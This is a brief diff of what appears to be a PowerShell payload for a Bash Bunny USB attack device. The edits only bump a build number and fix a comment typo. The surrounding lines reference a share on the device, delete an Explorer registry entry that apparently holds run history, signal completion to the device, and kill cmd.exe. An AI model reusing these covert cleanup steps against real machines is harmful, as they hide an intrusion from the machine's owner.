@@ -11,7 +11,7 @@
 #>
 
 $_Version = "2.0.2"
-$_BUILD = "1001"
+$_BUILD = "1003"
 
 # Share on bashbunny
 $SHARE="\\172.16.64.1\e"
@@ -99,7 +99,7 @@ Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explo
 # Rename CON_OK to CON_EOF so bunny knows that all the stuff has finished
 Rename-Item -Path "$SHARE\CON_OK" -NewName "$SHARE\CON_EOF"
 
-# Kill cmde.exe 
+# Kill cmd.exe 
 Stop-Process -name cmd -ErrorAction SilentlyContinue
 
 # Remove all Jobs from Joblist
